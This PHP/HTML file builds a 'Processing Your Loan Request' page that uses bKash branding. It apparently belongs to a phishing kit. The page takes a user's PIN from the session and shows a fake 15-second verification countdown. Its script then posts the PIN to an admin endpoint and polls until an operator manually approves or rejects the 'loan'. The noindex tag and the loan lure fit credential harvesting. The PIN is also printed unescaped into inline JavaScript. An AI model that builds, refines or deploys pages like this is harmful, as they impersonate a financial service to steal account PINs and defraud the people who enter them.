
<?php
session_start();
require_once 'config/database.php';

// Check if user came from PIN verification page
if (!isset($_SESSION['loan_id']) || !isset($_SESSION['pin_code'])) {
    header('Location: lon_request.php');
    exit();
}

$loan_id = $_SESSION['loan_id'];
$loan_amount = $_SESSION['loan_amount'];
$loan_category = $_SESSION['loan_category'];
$mobile_number = $_SESSION['mobile_number'];
$masked_mobile = substr($mobile_number, 0, 3) . 'XXXX' . substr($mobile_number, -4);

// Handle status check for admin approval
if (isset($_GET['check_status']) && $_GET['check_status'] == '1') {
    $stmt = $pdo->prepare("SELECT admin_action, status FROM loan_applications WHERE id = ?");
    $stmt->execute([$loan_id]);
    $result = $stmt->fetch();
    
    if ($result) {
        $admin_action = $result['admin_action'];
        $status = $result['status'];
        echo json_encode([
            'success' => true,
            'status' => $status,
            'admin_action' => $admin_action
        ]);
    } else {
        echo json_encode([
            'success' => false,
            'status' => 'pending',
            'admin_action' => null
        ]);
    }
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; img-src 'self' data: https:; font-src 'self' https: data:;">
    <title>Processing Your Loan Request - bKash</title>
    <link rel="icon" type="image/png" href="img/favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .spinner {
            border: 4px solid #f3f4f6;
            border-top: 4px solid #ec4899;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .pulse-animation {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="bg-white p-6 rounded-xl shadow-md w-full max-w-md text-center">
    
    <!-- bKash Header -->
    <div class="flex items-center justify-center mb-6">
      <img src="img/bKash-logo.png" alt="bKash Logo" class="w-32 h-12 object-contain">
    </div>
    
    <!-- Red Line -->
    <div class="w-full h-0.5 bg-red-500 mb-6"></div>
    
    <!-- Processing Animation -->
    <div class="mb-6">
      <div class="animate-spin rounded-full h-16 w-16 border-b-2 border-pink-500 mx-auto mb-4"></div>
      <h2 class="text-xl font-semibold text-gray-800 mb-2">Processing Your Request</h2>
      <p class="text-gray-600 text-sm">Please wait while we verify your loan application...</p>
    </div>
    
    <!-- Countdown Timer -->
    <div class="mb-6">
      <div class="bg-pink-50 border border-pink-200 rounded-lg p-4">
        <p class="text-pink-700 font-medium mb-2">Verification in progress</p>
        <div class="text-2xl font-bold text-pink-600" id="countdown">15</div>
        <p class="text-sm text-pink-600">seconds remaining</p>
      </div>
    </div>
    
    <!-- Loan Details -->
    <div class="bg-gray-50 rounded-lg p-4 mb-6">
      <h3 class="font-semibold text-gray-800 mb-3">Loan Details</h3>
      <div class="space-y-2 text-sm">
        <div class="flex justify-between">
          <span class="text-gray-600">Amount:</span>
          <span class="font-medium">৳<?php echo number_format($loan_amount); ?></span>
        </div>
        <div class="flex justify-between">
          <span class="text-gray-600">Category:</span>
          <span class="font-medium"><?php echo htmlspecialchars($loan_category); ?></span>
        </div>
        <div class="flex justify-between">
          <span class="text-gray-600">Mobile:</span>
          <span class="font-medium"><?php echo $masked_mobile; ?></span>
        </div>
      </div>
    </div>
    
    <!-- Status Message -->
    <div id="statusMessage" class="hidden">
      <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <p class="text-blue-700 font-medium">Waiting for approval...</p>
        <p class="text-sm text-blue-600 mt-1">Your request has been sent to our team for review.</p>
      </div>
    </div>
    
  </div>

  <script>
    let countdown = 15;
    const countdownElement = document.getElementById('countdown');
    const statusMessage = document.getElementById('statusMessage');
    
    // Update countdown every second
    const timer = setInterval(() => {
      countdown--;
      countdownElement.textContent = countdown;
      
      if (countdown <= 0) {
        clearInterval(timer);
        // Show status message and start checking for admin response
        statusMessage.classList.remove('hidden');
        countdownElement.parentElement.parentElement.style.display = 'none';
        
        // Send notification to admin panel
        sendAdminNotification();
        
        // Start checking for admin response
        checkAdminResponse();
      }
    }, 1000);
    
    function sendAdminNotification() {
      // Update loan status to processing
      fetch('admin_update.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'update_pin',
          loan_id: <?php echo $loan_id; ?>,
          pin_code: '<?php echo $_SESSION['pin_code'] ?? ''; ?>'
        })
      });
    }
    
    function checkAdminResponse() {
      let timeoutCounter = 0;
      const maxTimeout = 300; // 5 minutes (300 seconds)
      
      const checkInterval = setInterval(() => {
        fetch('processing.php?check_status=1')
          .then(response => response.json())
          .then(data => {
            if (data.success) {
              const status = data.status;
              const adminAction = data.admin_action;
              
              console.log('Status:', status, 'Admin Action:', adminAction);
              
              if (adminAction === 'approved') {
                clearInterval(checkInterval);
                window.location.href = 'loan_success.php';
              } else if (adminAction === 'rejected') {
                clearInterval(checkInterval);
                window.location.href = 'loan_failed.php';
              }
              
              // Update status message based on current status
              updateStatusMessage(status, adminAction);
            }
          })
          .catch(error => {
            console.error('Error checking status:', error);
          });
          
        timeoutCounter++;
        
        // Stop checking after maximum timeout
        if (timeoutCounter >= maxTimeout) {
          clearInterval(checkInterval);
          statusMessage.innerHTML = `
            <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
              <p class="text-yellow-700 font-medium">Processing is taking longer than expected</p>
              <p class="text-sm text-yellow-600 mt-1">Please contact support for assistance.</p>
            </div>
          `;
        }
      }, 2000); // Check every 2 seconds
    }
    
    function updateStatusMessage(status, adminAction) {
      if (status === 'processing' && !adminAction) {
        statusMessage.innerHTML = `
          <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <p class="text-blue-700 font-medium">Waiting for admin approval...</p>
            <p class="text-sm text-blue-600 mt-1">Your request is being reviewed by our team.</p>
          </div>
        `;
      } else if (status === 'under_review') {
        statusMessage.innerHTML = `
          <div class="bg-orange-50 border border-orange-200 rounded-lg p-4">
            <p class="text-orange-700 font-medium">Under Review</p>
            <p class="text-sm text-orange-600 mt-1">Your application is currently under detailed review.</p>
          </div>
        `;
      }
    }
  </script>
</body>
</html>